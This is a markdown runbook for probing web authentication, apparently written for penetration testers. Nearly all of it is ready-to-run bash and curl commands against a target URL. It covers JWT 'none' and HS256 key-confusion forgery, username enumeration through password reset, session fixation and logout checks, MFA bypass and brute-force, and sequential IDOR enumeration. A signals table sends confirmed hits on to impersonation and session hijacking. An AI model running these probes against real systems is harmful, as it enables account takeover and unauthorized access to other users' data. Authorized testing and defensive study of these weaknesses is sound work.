# Auth Probe Runbook

## Purpose
Low-impact probing of auth mechanisms. Test JWT manipulation, password reset token weaknesses, session fixation, MFA bypass, and IDOR.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — `$OUTDIR/cookies.txt`
- `$JWT_TOKEN` — discovered JWT token string
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/auth`

## Workflow A — JWT Analysis

### A1. Decode JWT header
```bash
echo "$JWT_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool > "$OUTDIR/jwt-header.json"
```

### A2. Decode JWT payload
```bash
echo "$JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool > "$OUTDIR/jwt-payload.json"
```

### A3. Check algorithm field
```bash
grep -i '"alg"' "$OUTDIR/jwt-header.json" && cat "$OUTDIR/jwt-header.json"
```

### A4. Test algorithm confusion (none attack)
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n "$JWT_TOKEN" | cut -d. -f2)
curl -sk -H "Authorization: Bearer ${HEADER}.${PAYLOAD}." "$TARGET_URL/api/user" -o "$OUTDIR/jwt-none-attack.txt"
grep -E '200 OK|HTTP/1.1 200' "$OUTDIR/jwt-none-attack.txt" && echo "JWT NONE ATTACK ACCEPTED: $TARGET_URL" >> "$OUTDIR/auth-hits.txt"
```

### A5. Test HS256 key confusion (sign with public key as secret)
```bash
HEADER_B64=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
curl -sk -H "Authorization: Bearer ${HEADER_B64}.${PAYLOAD}.DUMMY" "$TARGET_URL/api/user" -o "$OUTDIR/jwt-hs256-confusion.txt"
```

### A6. Check JWT expiry
```bash
EXP=$(python3 -c "import json,base64,sys; print(json.loads(base64.b64decode('$PAYLOAD'+'==').decode()).get('exp','no exp'))")
echo "JWT expires: $EXP (now: $(date +%s))"
```

## Workflow B — Password Reset Probing

### B1. Enumerate existing usernames/emails via reset
```bash
curl -sk "$TARGET_URL/forgot-password" -d "email=admin@target.com" -o "$OUTDIR/reset-probe-admin.txt"
curl -sk "$TARGET_URL/forgot-password" -d "email=nonexistent12345@target.com" -o "$OUTDIR/reset-probe-nope.txt"
grep -qiE 'not found|does not|invalid email|no such|user not' "$OUTDIR/reset-probe-nope.txt" && echo "USERNAME ENUMERATION VIA RESET" >> "$OUTDIR/auth-hits.txt"
```

### B2. Check reset token predictability
```bash
curl -sk "$TARGET_URL/forgot-password" -d "email=your-test@target.com" -o "$OUTDIR/reset-trigger1.txt"
sleep 2
curl -sk "$TARGET_URL/forgot-password" -d "email=your-test@target.com" -o "$OUTDIR/reset-trigger2.txt"
```

### B3. Check if reset token is in URL (Referer leakage risk)
```bash
grep -oE 'token=[a-zA-Z0-9_-]+' "$OUTDIR/reset-trigger1.txt" >> "$OUTDIR/reset-tokens.txt"
```

## Workflow C — Session Management Probing

### C1. Test session fixation
```bash
curl -sk -c "$OUTDIR/session-fixation-before.txt" -o /dev/null "$TARGET_URL"
curl -sk -b "$OUTDIR/session-fixation-before.txt" -c "$OUTDIR/session-fixation-after.txt" -d "username=test&password=test" "$TARGET_URL/login" -o /dev/null
diff "$OUTDIR/session-fixation-before.txt" "$OUTDIR/session-fixation-after.txt" && echo "SESSION FIXATION: no session rotation on login" >> "$OUTDIR/auth-hits.txt" || echo "OK: session rotated"
```

### C2. Check session expiry on logout
```bash
curl -sk -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$TARGET_URL/logout" -o /dev/null
curl -sk -b "$COOKIE_JAR" "$TARGET_URL/dashboard" -o "$OUTDIR/session-after-logout.txt"
grep -q 'dashboard\|profile\|account' "$OUTDIR/session-after-logout.txt" && echo "SESSION NOT INVALIDATED ON LOGOUT" >> "$OUTDIR/auth-hits.txt"
```

## Workflow D — MFA Probing

### D1. Direct navigation bypass attempt
```bash
curl -sk -b "$COOKIE_JAR" "$TARGET_URL/dashboard" -o "$OUTDIR/mfa-bypass.txt"
grep -qE 'dashboard|welcome|profile' "$OUTDIR/mfa-bypass.txt" && echo "POTENTIAL MFA BYPASS: dashboard accessible without 2FA" >> "$OUTDIR/auth-hits.txt"
```

### D2. Try numeric MFA code brute-force
```bash
curl -sk "$TARGET_URL/verify-mfa" -d "code=9999" -o "$OUTDIR/mfa-brute.txt"
grep -qE 'too many attempts|blocked|locked' "$OUTDIR/mfa-brute.txt" && echo "MFA RATE LIMITED" || echo "MFA NO RATE LIMIT DETECTED" >> "$OUTDIR/auth-hits.txt"
```

## Workflow E — IDOR Probing

### E1. Sequential ID enumeration
```bash
sort -u "$OUTDIR/idor-candidates.txt" > "$OUTDIR/idor-unique.txt"
while read -r endpoint; do
  ORIG_ID=$(echo "$endpoint" | grep -oP '\d+$')
  ALT_ID=$((ORIG_ID + 1))
  ALT_URL=$(echo "$endpoint" | sed "s/${ORIG_ID}$/${ALT_ID}/")
  ORIG_LEN=$(curl -sk "$TARGET_URL$endpoint" | wc -c)
  ALT_LEN=$(curl -sk "$TARGET_URL$ALT_URL" -b "$COOKIE_JAR" | wc -c)
  echo "$endpoint: $ORIG_LEN bytes, $ALT_URL: $ALT_LEN bytes" >> "$OUTDIR/idor-size-check.txt"
done < "$OUTDIR/idor-unique.txt"
```

## Signals
| Signal | Confidence | Action |
|---|---|---|
| JWT `alg:none` accepted | High | Verify with user impersonation |
| Username enumeration via reset | Medium | Confirm with known users |
| Session not rotated on login | Medium | Test session hijacking |
| Session valid after logout | High | Report session mgmt issue |
| MFA bypassable | High | Verify with full flow |
| IDOR size mismatch | Medium | Go to verify |

## Next Routing
- Hit confirmed -> `runbooks/03-verify.md`
- No hits -> expand scope or stop
